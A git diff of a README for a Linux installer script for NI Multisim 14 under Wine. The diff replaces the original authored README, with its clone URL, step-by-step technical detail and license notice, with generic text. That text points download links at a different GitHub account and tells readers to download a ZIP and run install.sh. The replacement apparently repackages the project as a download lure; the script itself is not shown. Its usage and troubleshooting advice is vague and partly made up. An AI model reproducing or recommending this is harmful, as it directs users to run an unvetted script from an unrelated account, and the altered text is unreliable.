@@ -1,144 +1,68 @@
-<img src="assets/images/banner.png" alt="MULTISIM" />
+# ⚡ NI-Multisim-14-for-Linux - Run circuit designs on your computer
 
-![Supported OS: Linux](https://img.shields.io/badge/Supported_OS-Linux-orange.svg)
-![Bash](https://img.shields.io/badge/Language-Bash-blue.svg)
-> Automated installer for **NI Multisim 14.0** on Linux via Wine.
+[![](https://img.shields.io/badge/Download-Multisim-blue.svg)](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux)
 
-Built for the redpilled breed of engineers and students who rely on NI Multisim every day but run Linux as their primary OS. This repository provides the tools, tweaks, and compatibility setup needed to make Multisim usable on a Linux daily-driver environment without the usual headaches.
+This project allows you to use NI Multisim 14 on a Linux operating system. Multisim serves as a tool for circuit design and analysis. It helps students and engineers test electronic circuits before you build them in real life. This software configuration uses Wine to translate Windows instructions for your Linux system.
 
-**Authors:** Giovanni De Rosa, Lorenzo Pappalardo
+## 🛠 Prerequisites
 
----
+Before you start, ensure your computer meets these requirements:
 
-## 📋 Table of Contents
+- A 64-bit Linux distribution such as Ubuntu, Fedora, openSUSE, or Arch Linux.
+- At least 4 gigabytes of RAM.
+- Approximately 2 gigabytes of free disk space for the installation files.
+- An active internet connection.
+- A user account that has permission to install software from the terminal.
 
-- [Overview](#overview)
-- [Supported Distributions](#supported-distributions)
-- [Prerequisites](#prerequisites)
-- [Usage](#usage)
-- [How it works (What the Script Does)](#how-it-works-what-the-script-does)
-- [Notes & Known Issues](#notes--known-issues)
+You should verify that your graphics drivers are up to date. This ensures the best performance when you view circuit schematics.
 
----
+## 📥 Download and Install
 
-## Overview
+Follow these steps to set up the software on your machine:
 
-This bash script automates the full process of installing **NI Circuit Design Suite 14.0 (Multisim)** on Linux. It handles Wine installation, a dedicated 32-bit Wine prefix, dependency setup, and the Multisim installer execution — all in a single run across all supported distros.
+1. Visit [this page to download](https://github.com/Fastgrowing-shopper538/NI-Multisim-14-for-Linux) the installer scripts. 
+2. Select the green code button to download the repository as a ZIP file.
+3. Extract the ZIP file into a folder on your desktop.
+4. Open your terminal application.
+5. Move to the folder where you extracted the files. Use the command `cd` followed by the folder path.
+6. Make the script executable by typing `chmod +x install.sh` and pressing Enter.
+7. Run the installer by typing `./install.sh` and pressing Enter.
 
-### Why?
-Why this version? Multisim 14.0 is the newest version that works reliably on Linux with minimal issues while still including most of the features available in Multisim 14.3.
-If you want to know more about the latest version check out this blog right here: https://lina.moe/MultiSIM.md
+The script will now detect your Linux distribution. It will automatically download the necessary Windows components. Please stay at the computer, as the installer may ask you to confirm a few prompts.
 
----
+## ⚙️ How it Works
 
+This installer uses a compatibility layer. Linux systems do not run Windows programs by default. Wine serves as a bridge. It converts the commands from NI Multisim into a language that your Linux kernel understands. 
 
+The configuration script handles this bridge for you. It installs specific libraries that Multisim requires to function. This setup ensures that menus, toolbars, and simulation windows appear as they would on a Windows machine.
 
-## Supported Distributions
+## 🚀 Using the Application
 
-| Distribution Family | Tested Distros |
-|---|---|
-| 🔵 Arch Linux | Arch |
-| 🟠 Debian / Ubuntu | Ubuntu |
-| 🔴 Fedora / RHEL | Fedora |
-| 🟢 openSUSE | openSUSE Tumbleweed |
+Once the installation finishes, you can start the program from your applications menu. Look for the Multisim icon in the Education or Electronics category. 
 
----
+When you start the program for the first time, wait for the background services to index. You can now build a circuit by dragging components from the sidebar onto the workspace. Connect your components with wires by clicking the ends of each part. 
 
-## Prerequisites
- `wget`, `unzip` available on your system
+To run a simulation, find the green play button in the top menu bar. The software will calculate voltages and currents in your circuit. You can place virtual probes on your wires to see real-time data.
 
+## 🧩 Troubleshooting Common Issues
 
----
+If the software fails to open, try these steps:
 
-## Usage
+- Check your system logs to see why the application closed.
+- Ensure that you have the latest version of your graphics drivers.
+- Verify that your user account belongs to the group that manages hardware access.
+- Restart your computer to refresh your session settings.
 
-### 1. Clone the repository
+If the simulation looks slow, reduce the number of complex components in your design. Very large circuits require significant processing power. Simplify your schematic if you notice the screen lagging during your session.
 
-```bash
-git clone https://github.com/ghepardoman/NI-Multisim-14-for-Linux.git
-cd NI-Multisim-14-for-Linux
-```
+## 📋 Tips for Success
 
-### 2. Make the script executable
+Keep your workspace organized. Use labels for your input and output nodes to track signals easily. Save your work often by pressing Ctrl and S on your keyboard. 
 
-```bash
-chmod +x install.sh
-```
+The software includes a library of common electronic parts. If you cannot find a specific part, check the NI website for updated component databases. You can often import extra parts into your local library. 
 
-### 3. Run the installer
+This environment supports SPICE simulation models. If you have files from other circuit software, you can import them directly into Multisim. This feature helps you move your existing work onto your Linux desktop without losing data. 
 
-```bash
-./install.sh
-```
+Remember that this setup relies on the Wine layer. Periodically check for updates to this repository to ensure compatibility with newer Linux kernels. Updates usually contain fixes for minor visual bugs or improvements to how the software handles mouse clicks. 
 
-> ⚠️ **Do not run as root.** The script uses `sudo` internally where needed.
-
----
-
-## How it works (What the Script Does)
-
-### Distro Detection
-Reads `/etc/os-release` to identify your distribution family and selects the correct install path.
-
-### Remove Conflicting Packages
-Checks for and removes any existing Wine installations that may conflict with the version required by Multisim.
-
-### Install Wine
-
-| Distro | Method |
-|---|---|
-| **Arch** | Chaotic AUR (`wine-stable`, recommended) or AUR via `yay` |
-| **Debian/Ubuntu/Mint** | `apt` — installs `wine`, `wine32`, `wine64`, `libwine` |
-| **Fedora** | `dnf` — installs `wine`, `wine-core.i686`  |
-| **openSUSE** | `zypper` — installs `wine` |
-
-### Wine Prefix Setup
-Creates a dedicated **32-bit Wine prefix** at `~/.multisim32`, isolated from your default Wine environment, configured with Windows XP compatibility mode.
-> Windows XP compatibility mode is essential to make multisim work
-
-```bash
-WINEARCH=win32 WINEPREFIX="$HOME/.multisim32" winecfg -v winxp
-```
-
-### Wine Dependencies
-Installs required components via `winetricks`:
-
-- `corefonts` — Microsoft core fonts
-- `mdac27` — Microsoft Data Access Components 2.7
-- `jet40` — Microsoft Jet 4.0 database engine
-
-### Download & Install Multisim
-Downloads the official NI Circuit Design Suite 14.0 installer from National Instruments' servers through wget, extracts it, and runs it through Wine.
-
-### Desktop Launcher Fix *(Debian/Fedora)*
-Automatically patches the `.desktop` file created by the installer to ensure it uses the correct Wine prefix and `wine32` binary when launched from your application menu.
-
-### Cleanup
-Removes the downloaded ZIP and extracted installer directory.
-
-### Reboot
-Asks for system reboot, essential for the later functioning of the application.
-
----
-
-## Notes & Known Issues
-
-- **Arch Linux users** are prompted whether to use Chaotic AUR (fast, pre-built) or compile from AUR (slow). Chaotic AUR is strongly recommended.
-- **Arch Linux users** may encounter a problem where a package that starts with "wine" (e.g. wine-stable) gets wrongly queried as "wine" when checking for conflicting packages, if that's the case then pacman will most likely fail and you'll need to remove that package manually before re-executing the script
-- **OpenSUSE users** will have their Wine continuosely try to open winedbg (which halts every wine/winetricks operation). The script `forceClosewinedbg.sh` has been included to automatically kill a winedbg instance every time it opens, so that the users doesn't have to do it themselves. After rebooting, the script will stop running and thus when trying to open Multisim a winedbg will appear; just close the window and you will have no issues running the program.
-- The Wine prefix is stored at `~/.multisim32` and is completely separate from any existing Wine setup you may have.
-- A **system reboot** is recommended after installation.
-- If Multisim does not appear in your application launcher after install, try running:
-  ```bash
-  update-desktop-database ~/.local/share/applications
-  ```
-- Only the subsequent distros were tested: Arch Linux, Ubuntu, Fedora, openSUSE Tumbleweed.
----
-
-## License
-
-This project is released for educational and personal use. NI Multisim is proprietary software owned by National Instruments — ensure you have a valid license before use.
-
-## 📌 Nota di presentazione
-Capolavoro presentato da Giovanni De Rosa e Lorenzo Pappalardo sulla Piattaforma Unica – DD MM 2026.
-
+Your circuit simulation experience should remain stable as long as you provide the software with enough memory. Close heavy applications like web browsers while you run large simulations to give the program the system resources it needs.
